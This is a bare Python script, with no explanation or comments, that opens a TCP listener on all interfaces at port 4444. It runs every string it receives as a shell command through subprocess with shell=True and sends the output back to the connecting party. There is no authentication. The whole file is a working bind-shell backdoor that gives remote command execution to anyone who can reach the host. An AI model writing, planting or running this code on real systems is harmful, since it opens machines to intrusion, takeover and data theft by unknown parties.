import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", 4444))
s.listen(1)

print("Listening for incoming connections...")

while True:
    conn, addr = s.accept()
    print(f"Connection from {addr}")
    
    while True:
        command = conn.recv(1024).decode()
        if not command:
            break
        
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = process.stdout.read() + process.stderr.read()
        conn.sendall(output)

conn.close()
